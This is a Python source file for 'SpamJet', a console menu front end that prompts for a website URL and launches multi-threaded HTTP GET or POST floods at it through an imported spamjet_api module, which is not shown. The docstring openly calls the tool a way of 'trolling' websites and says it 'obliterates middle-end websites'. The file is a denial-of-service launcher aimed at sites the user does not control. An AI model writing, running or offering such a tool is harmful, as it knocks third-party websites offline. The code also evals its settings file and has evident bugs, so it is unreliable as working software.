import colorama
import msvcrt
import os
import requests
import spamjet_api
import sys

from colorama import Fore, Back, Style
from threading import Thread
from time import sleep, time


__doc__ = """Tool for stress-testing (trolling) websites ;)
100 threads for best performance, obliterates middle-end websites"""


with open('settings.txt', mode='r') as settingsfile:
    settings = eval(settingsfile.read())

WIDTH = 128
HEIGHT = 32

os.system(f'mode con cols={WIDTH} lines={HEIGHT}')
colorama.init(autoreset=True)

current_page = 'main'
current_index = 0

def clear():
    os.system('cls')

def page_switch(newpage):
    global current_page
    current_page = newpage

def hook_slider_adjust(target, key, menu_page, index):
    while True:
        key = msvcrt.getch().decode()
        if key == '\n':
            display_page(menu[menu_page])  # TODO: implement and make sure that it clears the screen

        else:
            if key == '[':
                if target[key] > 0:
                    target[key] -= 1

            elif key == ']':
                target[key] += 1

def start_crashing_page():
    url = input('Crash website: ')
    spammer = spamjet_api.HttpSpammer()
    if settings['mode'] == 'POST':
        spammer.connect(url, settings['threads'], mode='POST', body='a'*10000)
    else:
        spammer.connect(url, settings['threads'])
    spammer.start()

def tick(get_input, last_pressed=''):
    global current_page
    global current_index
    if get_input:
        key = msvcrt.getch().decode()
        if key == '[':
            current_index -= 1
        elif key == ']':
            current_index += 1
        elif key == '\n':
            menu[current_page][current_index]['on_enter'](*menu[current_page][current_index]['args'])  # Run the code
    if last_pressed:
        if last_pressed == '[':
            current_index -= 1
        elif last_pressed == ']':
            current_index += 1
        
    if not menu[current_page][current_index]['selectable']:
        tick(False, last_pressed=key if key else ']')
    current_index %= len(menu)
    
    clear()
    for item in range(len(menu[current_page])):
        if item == current_index:
            print(Fore.WHITE + Back.BLACK + menu[current_page][item]['text'](None))
        else:
            print(menu[current_page][item]['text'](None))

def nothing():
    """This function does nothing. It returns nothing (None)"""
    pass

menu = {
    'main': [
        {'text': lambda x: 'Welcome to SpamJet 1.2.0\n' + '='*32 + '\n', 'selectable': False, 'on_enter': nothing, 'args': ()},
        {'text': lambda x: 'Currently crashing', 'selectable': True, 'on_enter': page_switch, 'args': ('crashing',)},
        {'text': lambda x: 'Start crashing', 'selectable': True, 'on_enter': start_crashing_page, 'args': ()},
        {'text': lambda x: 'Stop all', 'selectable': True, 'on_enter': spamjet_api.stop_all, 'args': ()},
        {'text': lambda x: 'Options', 'selectable': True, 'on_enter': page_switch, 'args': ('options')},
        {'text': lambda x: 'Quit', 'selectable': True, 'on_enter': sys.exit, 'args': ()}
        ],
    'options': [
        {'text': lambda x: 'Options\n' + '='*32 + '\n', 'selectable': False, 'on_enter': nothing, 'args': ()},
        {'text': lambda x: 'Create new crashers using {settings["threads"]} threads', 'on_enter': hook_slider_adjust, 'args': (settings, 'threads', 'options', 1)}
        ]
    }

while True:
    tick(True)
